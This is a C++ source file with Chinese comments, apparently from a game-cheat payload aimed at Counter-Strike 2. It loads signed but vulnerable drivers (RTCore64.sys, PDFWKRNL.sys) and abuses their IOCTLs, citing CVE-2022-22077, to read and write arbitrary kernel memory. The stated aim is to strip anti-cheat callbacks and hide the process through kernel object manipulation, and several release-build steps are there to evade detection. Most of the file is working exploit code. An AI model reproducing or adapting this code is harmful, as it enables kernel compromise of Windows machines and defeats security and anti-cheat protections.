// ============================================================
// byovd_kernel.cpp — BYOVD 内核级 EAC 防御完整实现
//
// 技术栈:
//   1. RTCore64.sys BYOVD 加载 (合法签名漏洞驱动)
//   2. 内核VA R/W: IOCTL 0x80002048/0x4C 直接读写任意内核虚拟地址 (v3.124: 唯一路径)
//   3. Sigscan ObRegisterCallbacks → 定位 ObpCallbackArrayHead
//   4. 遍历回调数组 → NULL EAC 的所有注册回调
//   5. DKOM EPROCESS 断链 (可选, 触发 PatchGuard)
//
// 注意: v3.124 使用 PhysicalReadViaIOCTL (0x80002048) 直接读写内核VA,
//   此 RTCore64 版本不支持 VirtualReadViaIOCTL (0x80002000, err=87)。
//   物理 IOCTL (0x80002048/0x4C) 实际功能是直接读写内核VA, 非 MmMapIoSpace。
// ============================================================

#include "byovd_kernel.h"
#include "module_resolver.h"  // ★ BUILD 550: GetModuleBaseFromPEB 替代 GetModuleHandleW
#include "string_obfuscator.h"  // ★ BUILD 550: STEALTH_STR_DECRYPT_TO / STEALTH_WSTR_DECRYPT_TO
// ★ BUILD 565: StealthMemory + StealthProcess (跨进程 R/W + 模块枚举) for NtReadHooker
#include "stealth_process.h"
#include <winreg.h>
#include <winternl.h>
#include <winsvc.h>
#include <cstdio>
#include <cstring>
// ★ BUILD 501: 移除 <algorithm> <fstream> <random> <ctime> <cstdarg> — CRT 堆依赖
// ★ BUILD 510: 探索所有 FltGlobals 外部指针, 选择命名条目最多的作为 FilterList (修复 +0xF8 假阳性)
#include <Psapi.h>
#include <shlobj.h>
#include <tlhelp32.h>  // ★ BUILD 567 v3.289: CreateToolhelp32Snapshot (PvpAlivePatcher)
#include "syscall_direct.h"  // ★ BUILD 484: TartarusGate::GenerateSyscallStub for NtLoadDriver
#ifdef _MSC_VER
#include <intrin.h>
#endif

// ★ BUILD 551: ByovdDiag 条件编译消除
//   原因: byovd_kernel.cpp 中 383 处 ByovdDiag 调用包含 "BYOVD:"/"VERIFY:"/"FLT:"/
//         "DKOM:"/"TRACE:"/"B549:"/"B550:" 等明文格式字符串,这些字符串在 release
//         编译后会进入 .rdata 段 (约 30+ KB),被 PAC 内存扫描发现
//         (逆向确认 PAC 通过 MessageTransfer.sys minifilter 扫描进程内存)
//   策略: release 编译 (NDEBUG) 时, ByovdDiag 宏展开为 ((void)0),
//         所有 383 处调用被预处理器消除 → 字符串字面量不进入 .rdata 段
//         debug 编译时保留原 static void ByovdDiag 函数实现
//   审计: 383 处调用均为纯日志输出, 参数无副作用 (仅读取变量/GetLastError)
//         经审计无 x++ / 函数调用副作用, 宏消除安全
//   收益: payload.dll .rdata 段减少约 30 KB 明文特征, 消除 "BYOVD:" 等关键字
#ifdef NDEBUG
    // ★ BUILD 551: Release 模式 — ByovdDiag 完全消除 (字符串不进入二进制)
    #define ByovdDiag(fmt, ...) ((void)0)
#else
    // Debug 模式 — 保留日志输出 (写 %TEMP%\sd.log)
// ★ BUILD 567 v3.227: 时间戳格式化 (与 payload.cpp DiagLog_FormatTimestamp 同实现)
static void ByovdDiag_FormatTimestamp(char* buf, size_t bufSize) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(buf, bufSize, "[%02d:%02d:%02d.%03d] ",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
}

// ★ BUILD 567 v3.227: 日志轮转 (调用前文件句柄必须已关闭)
static void ByovdDiag_RotateIfNeeded(const wchar_t* path) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExW(path, GetFileExInfoStandard, &fad)) return;
    ULARGE_INTEGER fileSize;
    fileSize.LowPart  = fad.nFileSizeLow;
    fileSize.HighPart = fad.nFileSizeHigh;
    if (fileSize.QuadPart < (10ULL * 1024 * 1024)) return;
    wchar_t path1[MAX_PATH], path2[MAX_PATH];
    wcscpy_s(path1, MAX_PATH, path);  wcscat_s(path1, MAX_PATH, L".1");
    wcscpy_s(path2, MAX_PATH, path);  wcscat_s(path2, MAX_PATH, L".2");
    MoveFileExW(path1, path2, MOVEFILE_REPLACE_EXISTING);
    MoveFileExW(path, path1, MOVEFILE_REPLACE_EXISTING);
}

static void ByovdDiag(const char* fmt, ...) {
    char tsBuf[32];
    ByovdDiag_FormatTimestamp(tsBuf, sizeof(tsBuf));
    int tsLen = (int)strlen(tsBuf);

    char buf[576];  // ★ BUILD 567: 512 → 576 (容纳时间戳)
    memcpy(buf, tsBuf, tsLen);
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf + tsLen, sizeof(buf) - tsLen, fmt, args);
    va_end(args);
    if (len < 0) return;
    // ★ BUILD 567 BUG 修复 (第 1 轮审查): vsnprintf 返回期望长度, 可能 > 缓冲区剩余空间
    //   未限制会导致 WriteFile 越界读取 buf 后面的内存
    if (len > (int)(sizeof(buf) - tsLen - 1)) len = (int)(sizeof(buf) - tsLen - 1);
    len += tsLen;

    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"sd.log");  // ★ BUILD 549: 文件名脱敏 (与 payload.cpp 一致)
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        FlushFileBuffers(h);  // ★ v3.38: 强制落盘
        CloseHandle(h);
    }
    // ★ BUILD 567 v3.227: 日志轮转检查
    ByovdDiag_RotateIfNeeded(path);
}
#endif  // NDEBUG

// ★ BUILD 567 v3.227: StateLog — 状态变化日志 (独立于 ByovdDiag, 不被 NDEBUG 消除)
//   原因: 状态变化时间线是封号分析的关键, 必须在 release 模式下也输出
//   实现: 直接写 sd.log (与 DiagLog 同路径), 添加时间戳前缀 + 10MB 轮转
//   格式: "[HH:MM:SS.mmm] STATE:CAT:EVENT detail\n"
//   注: 与 payload.cpp DiagLogState 宏输出格式一致, 便于日志分析
static void StateLog(const char* cat, const char* evt, const char* fmt, ...) {
    // 时间戳前缀
    SYSTEMTIME st;
    GetLocalTime(&st);
    char tsBuf[32];
    snprintf(tsBuf, sizeof(tsBuf), "[%02d:%02d:%02d.%03d] ",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    char buf[640];
    int prefixLen = snprintf(buf, sizeof(buf), "%sSTATE:%s:%s ", tsBuf, cat, evt);
    if (prefixLen < 0 || prefixLen >= (int)sizeof(buf)) return;

    va_list args;
    va_start(args, fmt);
    // -1 留给末尾 \n
    int len = vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen - 1, fmt, args);
    va_end(args);
    if (len < 0) return;
    // ★ BUILD 567 BUG 修复 (第 1 轮审查): vsnprintf 返回期望长度, 可能 > 缓冲区剩余空间
    //   vsnprintf 实际可写入字符数 = sizeof(buf) - prefixLen - 2 (留 1 给 \n, 1 给 null)
    //   未限制会导致 buf[len]='\n' 写越界 + WriteFile 越界读取
    if (len > (int)(sizeof(buf) - prefixLen - 2)) len = (int)(sizeof(buf) - prefixLen - 2);
    len += prefixLen;
    // 添加换行 (确保不超过缓冲区)
    if (len < (int)sizeof(buf) - 1) {
        buf[len] = '\n';
        len++;
    }

    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"sd.log");
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        FlushFileBuffers(h);
        CloseHandle(h);
    }
    // 日志轮转检查 (与 DiagLog_RotateIfNeeded 同实现, 独立避免依赖 ByovdDiag 辅助函数)
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (GetFileAttributesExW(path, GetFileExInfoStandard, &fad)) {
        ULARGE_INTEGER fileSize;
        fileSize.LowPart  = fad.nFileSizeLow;
        fileSize.HighPart = fad.nFileSizeHigh;
        if (fileSize.QuadPart >= (10ULL * 1024 * 1024)) {
            wchar_t path1[MAX_PATH], path2[MAX_PATH];
            wcscpy_s(path1, MAX_PATH, path);  wcscat_s(path1, MAX_PATH, L".1");
            wcscpy_s(path2, MAX_PATH, path);  wcscat_s(path2, MAX_PATH, L".2");
            MoveFileExW(path1, path2, MOVEFILE_REPLACE_EXISTING);
            MoveFileExW(path, path1, MOVEFILE_REPLACE_EXISTING);
        }
    }
}

// ★ BUILD 567 v3.231: VadDiag — VAD 诊断日志 (不受 NDEBUG 影响)
//   原因: ByovdDiag 在 Release 模式下被 #define 为 ((void)0), VAD 失败日志无法输出
//   方案: 独立日志函数, 直接写 sd.log, 添加时间戳前缀 (与 StateLog 同实现)
//   用途: VAD 隐藏失败诊断 (B554:EEP/EVR/GEP/CR 系列), 定位 VAD 隐藏 0/1 失败原因
static void VadDiag(const char* fmt, ...) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char tsBuf[32];
    snprintf(tsBuf, sizeof(tsBuf), "[%02d:%02d:%02d.%03d] ",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    char buf[640];
    int tsLen = (int)strlen(tsBuf);
    memcpy(buf, tsBuf, tsLen);

    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf + tsLen, sizeof(buf) - tsLen, fmt, args);
    va_end(args);
    if (len < 0) return;
    if (len > (int)(sizeof(buf) - tsLen - 1)) len = (int)(sizeof(buf) - tsLen - 1);
    len += tsLen;

    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"sd.log");
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        // ★ BUILD 567 v3.233: 移除 FlushFileBuffers — 减少 I/O 阻塞, 避免拖慢主循环
        //   原因: FlushFileBuffers 是同步操作, v3.232 测试 CS2 仅运行 15 秒 (vs v3.231 的 62 秒)
        //   风险: CS2 崩溃时最后几条日志可能丢失, 但 OS 缓存通常会在崩溃前刷盘
        CloseHandle(h);
    }
}

// ★ BUILD 567 v3.227: 全局统计计数器 extern 声明 (定义在 payload.cpp)
//   类型 LogStats 在 byovd_kernel.h 中定义 (共享)
//   byovd_kernel.cpp 在 PatchVmxOnWrapper/PatchShvInstallEntry 成功/失败时更新
extern LogStats g_logStats;

// ★ v3.296 FIX-18: CS2 退出标志 — 防止 minifilter 链表遍历蓝屏
//   定义在 payload.cpp, 此处声明. 0=CS2 alive, 1=CS2 exited.
//   NeutralizeMessageTransfer/IsMessageTransferNeutralized 入口检查此标志,
//   CS2 退出后立即返回, 不遍历已释放的 FilterList 链表.
extern volatile LONG g_cs2Exited;

// BYOVD 驱动嵌入支持: 将 RTCore64.sys 编译进 payload
//   python scripts/embed_driver.py RTCore64.sys → rtcore64_embed.h
//   v3.47: 始终嵌入, 移除 #ifdef 编译开关 — 驱动从 TEMP 提取
// ★ BUILD 550: RTCore64.sys 嵌入数据已移除 (死代码)
//   原因: BUILD 490 后 g_driverCandidates[] 仅含 PDFWKRNL, RTCore64 分支永不执行
//   收益: 消除 .rdata 中 \Device\RTCore64 / \DosDevices\RTCore64 / ntoskrnl.exe 等明文
// #include "rtcore64_embed.h"
#include "pdfwkrnl_embed.h"   // ★ BUILD 489: PDFWKRNL.sys 替代驱动
#include <initializer_list>

#pragma comment(lib, "advapi32.lib")

// ★ v3.78: 全局引用 payload.cpp 中的 VEH 自愈备份缓冲区
//   由 MapPhysical 的主动恢复使用
extern uint8_t* g_backupBuf;
extern SIZE_T   g_backupLen;
extern uint8_t* g_backupCodeBase;
extern void*    g_vehHandlerPageVA;

namespace stealth {

// ============================================================
// ★ v3.69/v3.117: 受保护用户态区域全局变量 — 固定数组, 避免 std::vector CRT 堆依赖
// 注意: 单线程访问, 无需同步
// 注意: MAX_PROTECTED_REGIONS 已在 byovd_kernel.h 中定义, 此处不重复定义
// ============================================================
ProtectedUserRegion g_protectedUserRegions[MAX_PROTECTED_REGIONS] = {};
int g_protectedRegionCount = 0;

// ============================================================
// PML4 物理地址获取 — 通过 IOCTL 扫描物理内存
//
// ★ v3.84: mov cr3 是特权指令, 在用户态(Ring 3)执行会触发
//   STATUS_PRIVILEGED_INSTRUCTION (0xC0000096) → #GP(0)。
//   改为通过 RTCore64 IOCTL 直接映射物理内存,
//   扫描寻找当前进程的 PML4 表并缓存其物理地址。
//
//   原理: PML4 表是一个 4KB 页, 包含 512 个 uint64 表项。
//   内核半区 (entry 256-511) 在所有进程中共享相同的物理 PDPT 指向,
//   因此可通过验证内核 PML4E → PDPTE 链来确定 PML4 身份。
// ============================================================

// ★ ReadCR3 不能是 static — 需要在 byovd_kernel.h 中 friend 声明

// ★ v3.99: IOCTL 探测 — 逆向分析 RTCore64.sys 发现:
//   - IOCTL 基码: 0x80002000 (CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, ANY))
//   - 驱动 dispatch 检查: (ioctl + 0x7FFFE000) <= 0x54 → 有效范围 0x80002000~0x80002054
//   - 子码步长: 4 (0x00, 0x04, 0x08, ... 0x54)
//   - 已知子码功能:
//       0x00: 虚拟内存读/写 (48字节输入)
//       0x08: I/O 端口读字节
//       0x0C: I/O 端口读字
//       0x10: I/O 端口读双字
//       0x14: I/O 端口写字节
//       0x18: PCI 配置空间访问 (24字节输入)
//       0x1C: I/O 端口写双字
//       0x20: 简单操作/获取版本 (8字节输入)
//       0x28: RDMSR (12字节输入)
//       0x2C: WRMSR (12字节输入)
//       0x30: 物理内存映射 (MmMapIoSpace, 48字节输入)
//       0x34: 物理内存映射变体 (48字节输入)
//       0x40-0x54: 复用 0x30-0x34 的 handler
// ★ v3.103: 安全 IOCTL 探测 — 0x80002048/0x8000204C 为物理内存 R/W 主候选
//   参考: CVE-2022-22077, deepwiki RTCore64 Analysis
//   BSOD教训: 0x80002040(PCI Bus) 导致 err=1450 (资源耗尽) → 蓝屏
//   v3.102 错误: 0xC3502580 是 MSR 操作, 不是物理内存映射
//   v3.101 错误: 0x80002030/0x34 返回 err=87 (参数不匹配)
//   修复: 0x80002048(Read PhysMem) + 0x8000204C(Write PhysMem) 是正确 IOCTL
//   输入结构: { uint64_t physAddr; uint32_t size; uint32_t reserved; } (12-16字节)
//   测试物理地址: 0x100000 (1MB), 避开 BIOS 数据区
// ★ v3.122: 仅保留安全 IOCTL 候选 — 移除 0x80002030/0x34 (导致 BSOD)
static const uint32_t g_ioctlCandidates[] = {
    0x80002048,  // ★ 主候选: 物理内存读取 (MmMapIoSpace, CVE-2022-22077)
    0x8000204C,  // ★ 主候选: 物理内存写入 (MmMapIoSpace, CVE-2022-22077)
};
static const int g_ioctlCandidateCount = sizeof(g_ioctlCandidates) / sizeof(g_ioctlCandidates[0]);

// ★ v3.101: 安全测试物理地址 — 1MB 处, 避开 BIOS 数据区 (0-1MB)
static const uint64_t SAFE_TEST_PHYS = 0x100000;

// ★ v3.99: 请求格式枚举 — 适配 0x80002000 系列 IOCTL
//   逆向分析: 驱动使用 METHOD_BUFFERED, SystemBuffer 传递参数
//   不同 sub-code 对应不同输入结构大小:
//     0x00: 48字节 (虚拟内存 R/W)
//     0x08-0x1C: 8字节 (I/O 端口)
//     0x18: 24字节 (PCI 配置空间)
//     0x20: 8字节 (简单操作)
//     0x28/0x2C: 12字节 (RDMSR/WRMSR)
//     0x30/0x34: 48字节 (物理内存映射)
enum class RTCore64Format {
    FMT_48B_PA_AT_00 = 0,  // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
    FMT_48B_PA_AT_08,       // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
    FMT_32B_RAW,            // 32字节: { uint64_t pa; uint32_t sz; uint32_t fl; } (旧格式兼容)
    FMT_8B_RAW,             // 8字节: 仅 uint64_t (I/O port 等)
    FMT_12B_RAW,            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; } (MSR)
};

// ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;

// ★ v3.122: IOCTL 模式标志 — true=VirtualReadViaIOCTL (0x80002000), false=PhysicalReadViaIOCTL (0x80002048/0x4C)
//   虚拟内存 IOCTL 直接读写内核VA, 无需页表遍历; 物理内存 IOCTL 需要先 VA→PA 转换
//   默认 false (物理IOCTL模式), 探测成功时切换
static bool g_useVirtualIOCTL = false;

// ★ v3.114: 虚拟内存 R/W 用 IOCTL 0x80002000 (sub-code 0x00) — 此RTCore64版本不支持
//   物理内存 R/W 用 IOCTL 0x80002048/0x8000204C (sub-code 0x12/0x13)
// ★ v3.123: 实际测试证实 0x80002048 直接读写内核VA (非物理地址),
//   BUILD 407 (v3.109) 已验证此方案正常工作。
// ★ v3.120: 移至 VirtualReadViaIOCTL 之前 — 确保在第一次使用前定义
static const uint32_t IOCTL_VIRTUAL_MEM   = 0x80002000;   // 虚拟内存读/写 (不支持)
static const uint32_t IOCTL_PHYSICAL_READ  = 0x80002048; // 实际功能: 内核VA读取 (非MmMapIoSpace)
static const uint32_t IOCTL_PHYSICAL_WRITE = 0x8000204C; // 实际功能: 内核VA写入

// ★ BUILD 489: PDFWKRNL.sys IOCTL — AMD PDF Worker 内核VA memcpy
//   CTL_CODE(FILE_DEVICE_AMD_PDFW, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
//   = (0x8000 << 16) | (0x805 << 2) | 0 | 0 = 0x80002014
static const uint32_t IOCTL_AMDPDFW_MEMCPY = 0x80002014;

// ★ BUILD 489: PDFW_MEMCPY 结构体 — IOCTL 0x80002014 的输入/输出缓冲区
//   驱动内部: memcpy(Destination, Source, Size) — 内核态无安全检查
#pragma pack(push, 1)
struct PDFW_MEMCPY_REQUEST {
    uint8_t  Reserved[16];    // +0x00: 未使用
    void*    Destination;     // +0x10: 目标地址 (写到哪里)
    void*    Source;          // +0x18: 源地址 (从哪里读)
    void*    Reserved2;       // +0x20: 未使用
    uint32_t Size;            // +0x28: 拷贝字节数
    uint32_t Reserved3;       // +0x2C: 未使用
};  // sizeof = 0x30
#pragma pack(pop)

// ★ v3.104: 存储探测到的 IOCTL 码 (读/写分开)
static uint32_t g_probedReadIoctl  = 0;
static uint32_t g_probedWriteIoctl = 0;

// ★ BUILD 489: 驱动类型 — 区分 RTCore64 和 PDFWKRNL 的 IOCTL 路径
static bool g_isPdfwKrnl = false;

// ★ v3.115: 虚拟内存读取 — 使用 IOCTL 0x80002000 (sub-code 0x00)
// ★ v3.123: 修正输入格式 — 大多数 RTCore64 利用代码使用 address 在 +0x00 的格式:
//     +0x00: uint64_t kernel virtual address
//     +0x08: uint32_t size (1, 2, 或 4 字节)
//     +0x0C: uint32_t pad (设为 0)
//     +0x10: uint64_t value (输出: 读取的值)
//     +0x18: pad[28] (未使用)
//   旧格式 (v3.115-v3.122): size@+0x00, addr@+0x08 — 导致 err=87 (ERROR_INVALID_PARAMETER)
//   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
static bool VirtualReadViaIOCTL(HANDLE hDevice, uint64_t kernelVA, void* outBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;

    size_t bytesRead = 0;

    for (size_t off = 0; off < size; ) {
        // 每次读取最多 4 bytes (DWORD) — 驱动不支持 QWORD 单次读取
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t readSize = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 构造 IOCTL 输入 (48字节, 虚拟内存格式)
        //   +0x00: kernel virtual address
        //   +0x08: size (驱动读取此字段决定读取字节数)
        //   +0x10: output value (驱动写入读取结果)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x00) = kernelVA + off;
        *(uint32_t*)(buf + 0x08) = readSize;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRTUAL_MEM,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:VirtualRead: va=0x%llX off=%zu FAILED err=%u\n",
                      (unsigned long long)kernelVA, off, GetLastError());
            return false;
        }

        // 读取结果在 +0x10 (uint64_t)
        uint64_t readVal = *(uint64_t*)(buf + 0x10);
        memcpy((uint8_t*)outBuf + off, &readVal, (readSize < chunk) ? readSize : (uint32_t)chunk);
        off += chunk;
        bytesRead += chunk;
    }
    return bytesRead > 0;
}

// ★ v3.115: 虚拟内存写入 — 使用 IOCTL 0x80002000 (sub-code 0x00)
// ★ v3.123: 修正输入格式 — 与 VirtualReadViaIOCTL 保持一致:
//     +0x00: uint64_t kernel virtual address
//     +0x08: uint32_t size (1, 2, 或 4 字节)
//     +0x0C: uint32_t pad (设为 0)
//     +0x10: uint64_t value (输入: 要写入的值)
//     +0x18: pad[28] (未使用)
static bool VirtualWriteViaIOCTL(HANDLE hDevice, uint64_t kernelVA, const void* inBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;

    for (size_t off = 0; off < size; ) {
        // 每次写入最多 4 bytes (DWORD)
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t writeSize = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 读取要写入的值 (最多 4 bytes)
        uint64_t writeVal = 0;
        memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);

        // 构造 IOCTL 输入 (48字节, 虚拟内存格式)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x00) = kernelVA + off;
        *(uint32_t*)(buf + 0x08) = writeSize;
        *(uint64_t*)(buf + 0x10) = writeVal;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRTUAL_MEM,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:VirtualWrite: va=0x%llX off=%zu FAILED err=%u\n",
                      (unsigned long long)kernelVA, off, GetLastError());
        }
        off += chunk;
    }
    return true;
}

// ★ v3.115: 物理内存读取 — 使用 IOCTL 0x80002048 (sub-code 0x12)
//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
//   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
//   参考: https://github.com/grisuno/CVE-2022-22077
static bool PhysicalReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                  uint64_t physAddr, void* outBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;

    size_t bytesRead = 0;

    for (size_t off = 0; off < size; ) {
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 构造 IOCTL 输入 (48字节, 物理内存格式)
        //   +0x00: pad0[8] (unused)
        //   +0x08: physical address
        //   +0x18: sizeType (1=BYTE, 2=WORD, 4=DWORD)
        //   +0x1C: value (output)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x08) = physAddr + off;
        *(uint32_t*)(buf + 0x18) = sizeType;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:PhysRead: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
                      ioctlCode, (unsigned long long)(physAddr + off), GetLastError());
            return false;
        }

        // 读取结果在 offset +0x1C (value 字段, 总是 DWORD)
        uint32_t readVal = *(uint32_t*)(buf + 0x1C);
        uint32_t validBytes = (sizeType == 1) ? 1 : (sizeType == 2) ? 2 : 4;
        memcpy((uint8_t*)outBuf + off, &readVal, (validBytes < chunk) ? validBytes : (uint32_t)chunk);
        off += chunk;
        bytesRead += chunk;
    }
    return bytesRead > 0;
}

// ★ v3.115: 物理内存写入 — 使用 IOCTL 0x8000204C (sub-code 0x13)
//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
//   注意: 驱动不支持 QWORD 单次写入; 64位值通过两次 DWORD 写入完成
static bool PhysicalWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                   uint64_t physAddr, const void* inBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;

    // ★ v3.126q: 修复 C3 — 不再静默失败
    //   之前无条件 return true, 即使所有 DeviceIoControl 都失败
    //   这导致 EAC 回调"摘除"但实际上写入完全失败
    size_t written = 0; // 成功写入的字节数

    for (size_t off = 0; off < size; ) {
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        uint32_t writeVal = 0;
        memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);

        // 构造 IOCTL 输入 (48字节, 物理内存格式)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x08) = physAddr + off;
        *(uint32_t*)(buf + 0x18) = sizeType;
        *(uint32_t*)(buf + 0x1C) = writeVal;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:PhysWrite: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
                      ioctlCode, (unsigned long long)(physAddr + off), GetLastError());
        } else {
            written += chunk;
        }
        off += chunk;
    }
    return (written == size);
}

// 尝试一种 IOCTL 码 + 格式组合 (用于探测)
// ★ v3.104: 改为检测数据返回而非 VA 映射 — 验证返回数据是否合理
static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr,
                           RTCore64Format fmt, uint8_t** outVirtAddr, DWORD* outErr) {
    uint8_t inBuf[64] = {};
    DWORD inSize = 0;
    // ★ v3.99: output buffer 增大到 512 字节, 某些格式需要更大的输出空间
    union { uint8_t raw[512]; uint8_t* mappedPtr; } outBuf;
    outBuf.mappedPtr = nullptr;
    DWORD bytesRet = 0;

    switch (fmt) {
        case RTCore64Format::FMT_48B_PA_AT_00: {
            // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
            // 驱动内部: ZwOpenSection(\Device\PhysicalMemory) + ZwMapViewOfSection
            struct { uint64_t pa; uint64_t mappedVA; uint8_t pad[32]; } req;
            memset(&req, 0, sizeof(req));
            req.pa = physAddr;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_48B_PA_AT_08: {
            // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
            // 驱动内部: MmMapIoSpace(physAddr, ...)
            struct { uint64_t unk0; uint64_t pa; uint32_t sz; uint8_t pad[28]; } req;
            memset(&req, 0, sizeof(req));
            req.unk0 = 0;
            req.pa = physAddr;
            req.sz = 0x1000;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_32B_RAW: {
            // 旧格式: { uint64_t pa; uint32_t sz; uint32_t fl; }
            struct { uint64_t pa; uint32_t sz; uint32_t fl; } req;
            req.pa = physAddr;
            req.sz = 0x1000;
            req.fl = 0;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_8B_RAW: {
            // 8字节: 仅 uint64_t
            memcpy(inBuf, &physAddr, sizeof(physAddr));
            inSize = sizeof(physAddr);
            break;
        }
        case RTCore64Format::FMT_12B_RAW: {
            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; }
            struct { uint32_t idx; uint32_t hi; uint32_t lo; } req;
            req.idx = (uint32_t)physAddr;
            req.hi = 0;
            req.lo = 0;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
    }

    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                              inBuf, inSize,
                              outBuf.raw, sizeof(outBuf.raw),
                              &bytesRet, nullptr);
    DWORD err = GetLastError();
    if (outErr) *outErr = err;

    // ★ v3.99: 对于 0x80002030/0x34, 映射结果在 SystemBuffer[0x08] 处
    //   DeviceIoControl 会将 SystemBuffer 复制回 output buffer
    //   mappedVA 就在 outBuf 的前 8 字节 (或偏移 8 字节处)
    if (ok) {
        // 尝试从 output buffer 的不同偏移读取映射地址
        uint64_t candidateVA = 0;
        memcpy(&candidateVA, outBuf.raw, 8);
        if (candidateVA && candidateVA > 0x10000) {
            // 格式 FMT_48B_PA_AT_00: mappedVA 在 output[0x00]
            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
            return true;
        }
        memcpy(&candidateVA, outBuf.raw + 8, 8);
        if (candidateVA && candidateVA > 0x10000) {
            // 格式 FMT_48B_PA_AT_08: mappedVA 在 output[0x08]
            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
            return true;
        }
        // 如果 ok 但 mappedVA 为空, 可能驱动返回了成功但用了不同的输出格式
        // 尝试直接使用 output buffer 指针
        if (outBuf.mappedPtr) {
            *outVirtAddr = outBuf.mappedPtr;
            return true;
        }
    }
    return false;
}

// ★ v3.115: 安全 IOCTL 探测 — 使用 PhysicalReadViaIOCTL 验证物理内存读取
